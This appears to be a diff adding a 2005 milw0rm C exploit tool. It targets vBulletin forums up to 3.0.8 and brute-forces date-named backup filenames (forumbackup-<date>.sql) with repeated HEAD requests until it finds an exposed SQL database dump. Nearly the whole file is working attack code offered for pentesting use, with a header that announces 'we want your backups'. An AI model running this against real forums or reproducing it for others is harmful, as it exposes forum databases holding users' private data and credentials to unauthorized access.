@@ -1,0 +1,230 @@
+/*
+ * Needed to pentest a few vBulletin forums so I wrote this junk real quick.
+ * Reference: http://securitytracker.com/alerts/2005/Aug/1014805.html
+ * Good paths: /forum/ / /forum/archive/ /forum/cpadmin/
+ * Update 1: Code error fixes. /str0ke (str0ke@milw0rm.com)
+ * Update 2: Fixed datestring-version for international boards by hals1 (h4ls4bschn31d3r@gmx.net)
+ * Update 3: French vBulletin boards added by Tyn0r (tyn0r@atxteam.net)
+ * /str0ke
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#define SERVER_PORT 80
+
+char *getdate(int b){
+	static char datestring[40];
+	time_t ttt;
+        int minustime;
+	minustime=86400 * b;
+	ttt=time(NULL)- minustime;
+	strftime (datestring, sizeof(datestring), "%m-%d-%Y", localtime(&ttt));
+	printf("Searching: forumbackup-%s.sql\n", datestring);
+	return(datestring);
+}
+
+char *getdate2(int b){
+        static char datestring[40];
+        time_t ttt;
+        int minustime;
+        minustime=86400 * b;
+        ttt=time(NULL)- minustime;
+        strftime (datestring, sizeof(datestring), "%Y-%d-%m", localtime(&ttt));
+        printf("Searching: forumbackup-%s.sql\n", datestring);
+        return(datestring);
+}
+
+char *getdate3(int b){
+        static char datestring[40];
+        time_t ttt;
+        int minustime;
+        minustime=86400 * b;
+        ttt=time(NULL)- minustime;
+        strftime (datestring, sizeof(datestring), "%d-%m-%Y", localtime(&ttt));
+        printf("Searching: forumbackup-%s.sql\n", datestring);
+        return(datestring);
+}
+
+char *getdate4(int b){
+	static char datestring[40];
+	time_t ttt;
+        int minustime;
+	minustime=86400 * b;
+	ttt=time(NULL)- minustime;
+	strftime (datestring, sizeof(datestring), "%m.%d.%Y", localtime(&ttt)); // hals1
+	printf("Searching: forumbackup-%s.sql\n", datestring);
+	return(datestring);
+}
+
+char *getdate5(int b){
+        static char datestring[40];
+        time_t ttt;
+        int minustime;
+        minustime=86400 * b;
+        ttt=time(NULL)- minustime;
+        strftime (datestring, sizeof(datestring), "%Y.%d.%m", localtime(&ttt)); // hals1
+        printf("Searching: forumbackup-%s.sql\n", datestring);
+        return(datestring);
+}
+
+char *getdate6(int b){
+        static char datestring[40];
+        time_t ttt;
+        int minustime;
+        minustime=86400 * b;
+        ttt=time(NULL)- minustime;
+        strftime (datestring, sizeof(datestring), "%d.%m.%Y", localtime(&ttt)); // hals1
+        printf("Searching: forumbackup-%s.sql\n", datestring);
+        return(datestring);
+}
+
+char *getdate7(int b){
+        static char datestring[40];
+        time_t ttt;
+        int minustime;
+        minustime=86400 * b;
+        ttt=time(NULL)- minustime;
+        strftime (datestring, sizeof(datestring), "%d%m%Y", localtime(&ttt)); // Tyn0r
+        printf("Searching: forumbackup-%s.sql\n", datestring);
+        return(datestring);
+}
+
+main(int argc, char *argv[]) {
+
+ char buffer[1000],host[255],path[255],dog[255],c;
+ int sd, rc, i=0, d=0, b;
+ struct sockaddr_in localAddr, servAddr;
+ struct hostent *h;
+
+char *http =
+         "Accept: */*\r\n"
+         "Accept-Language: en-us,en;q=0.5\r\n"
+         "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
+         "User-Agent: we want your backups - milw0rm\r\n"
+         "Connection: close\r\n\r\n";
+
+if ( argc != 5) {
+	        printf("vBulletin <= 3.0.8 Accessible Database Backup Searcher /str0ke ! milw0rm.com\n");
+	        printf("usage: %s -h hostname/ip -p /path/ \n",argv[0]);
+	        exit(0);
+}
+
+
+ while ((c = getopt (argc, argv, "h:p:")) != EOF)
+       switch(c)
+       {
+               case 'h':
+                       strncpy(host,optarg,sizeof(host));
+                       break;
+               case 'p':
+                       strncpy(path,optarg,sizeof(path));
+                       break;
+       }
+
+ h = gethostbyname(host);
+ 
+ if(h==NULL) {
+   printf("Unknown Host '%s'\n",host);
+   exit(1);
+ }
+
+ printf("Trying To Connect To [%s]\n",host);
+ while(1){
+ servAddr.sin_family = h->h_addrtype;
+ memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);
+ servAddr.sin_port = htons(SERVER_PORT);
+ sd = socket(AF_INET, SOCK_STREAM, 0);
+ 
+ if(sd<0) {
+   perror("Can Not Open The Socket\n");
+   exit(1);
+ }
+
+ localAddr.sin_family = AF_INET;
+ localAddr.sin_addr.s_addr = htonl(INADDR_ANY);
+ localAddr.sin_port = htons(0);
+
+ rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));
+ 
+ if(rc<0) {
+   printf("%d: cannot bind port TCP %u\n",sd,SERVER_PORT);
+   perror("error ");
+   exit(1);
+ }
+
+ rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));
+
+ if(rc<0) {
+   perror("cannot connect\n");
+   exit(1);
+ }
+   memset(buffer,0,sizeof(buffer));
+
+   if ( d == 0 ) {
+   snprintf(buffer,sizeof(buffer), "HEAD %s/forumbackup-%s.sql HTTP/1.1\r\nHost: %s\r\n%s",path,getdate(i),host,http);
+   } else if ( d == 1 ) {
+   snprintf(buffer,sizeof(buffer), "HEAD %s/forumbackup-%s.sql HTTP/1.1\r\nHost: %s\r\n%s",path,getdate2(i),host,http);
+   } else if ( d == 2 ) {
+   snprintf(buffer,sizeof(buffer), "HEAD %s/forumbackup-%s.sql HTTP/1.1\r\nHost: %s\r\n%s",path,getdate3(i),host,http);
+   } else if ( d == 3 ) {
+   snprintf(buffer,sizeof(buffer), "HEAD %s/forumbackup-%s.sql HTTP/1.1\r\nHost: %s\r\n%s",path,getdate4(i),host,http);
+   } else if ( d == 4 ) {
+   snprintf(buffer,sizeof(buffer), "HEAD %s/forumbackup-%s.sql HTTP/1.1\r\nHost: %s\r\n%s",path,getdate5(i),host,http);
+   } else if ( d == 5 ) {
+   snprintf(buffer,sizeof(buffer), "HEAD %s/forumbackup-%s.sql HTTP/1.1\r\nHost: %s\r\n%s",path,getdate6(i),host,http);
+   } else if ( d == 6 ) {
+   snprintf(buffer,sizeof(buffer), "HEAD %s/forumbackup-%s.sql HTTP/1.1\r\nHost: %s\r\n%s",path,getdate7(i),host,http);
+   }
+
+   rc = send(sd,buffer, strlen(buffer), 0);
+   memset(buffer,0,sizeof(buffer));
+
+while(1)
+       {
+       rc=recv(sd,buffer,sizeof(buffer),0);
+       if(strstr(buffer,"404")) break;
+       if(strstr(buffer,"200 OK"))
+               {
+	       if ( d == 0 ) {
+               printf("Database backup found: %s%sforumbackup-%s.sql\n", host, path, getdate(i));
+	       }
+	       if ( d == 1 ) {
+               printf("Database backup found: %s%sforumbackup-%s.sql\n", host, path, getdate2(i));
+	       }
+	       if ( d == 2 ) {
+               printf("Database backup found: %s%sforumbackup-%s.sql\n", host, path, getdate3(i));
+	       }
+	       if ( d == 3 ) {
+	       printf("Database backup found: %s%sforumbackup-%s.sql\n", host, path, getdate4(i));
+	       }
+	       if ( d == 4 ) {
+	       printf("Database backup found: %s%sforumbackup-%s.sql\n", host, path, getdate5(i));
+	       }
+	       if ( d == 5 ) {
+	       printf("Database backup found: %s%sforumbackup-%s.sql\n", host, path, getdate6(i));
+	       }
+	       if ( d == 6 ) {
+	       printf("Database backup found: %s%sforumbackup-%s.sql\n", host, path, getdate7(i));
+	       }
+               exit(0);
+               }
+       memset(buffer,0,sizeof(buffer));
+       }
+close(sd);
+
+if ( d < 6 ) {
+	d++;
+} else {
+	d=0;
+        i++;
+}
+}
+}
+
+// milw0rm.com [2005-08-31]
